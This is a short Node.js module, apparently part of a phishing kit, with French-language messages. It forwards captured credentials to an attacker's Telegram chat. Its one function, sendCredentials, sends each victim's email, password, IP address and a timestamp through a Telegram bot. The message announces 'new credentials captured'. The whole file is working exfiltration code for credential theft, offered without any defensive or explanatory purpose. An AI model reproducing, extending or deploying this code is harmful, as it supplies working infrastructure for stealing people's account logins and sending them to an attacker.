const TelegramBot = require('node-telegram-bot-api');
const chalk = require('chalk');
require('dotenv').config();

const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);

module.exports = {
  sendCredentials: async (credentials) => {
    try {
      await bot.sendMessage(
        process.env.TELEGRAM_CHAT_ID,
        `📩 Nouveaux identifiants capturés!\n\n` +
        `🔑 Email: ${credentials.email}\n` +
        `🔒 Mot de passe: ${credentials.password}\n` +
        `🌍 IP: ${credentials.ip}\n` +
        `🕒 Date: ${new Date().toLocaleString()}`
      );
      return true;
    } catch (error) {
      console.error(chalk.red('Erreur Telegram:', error.message));
      return false;
    }
  }
};
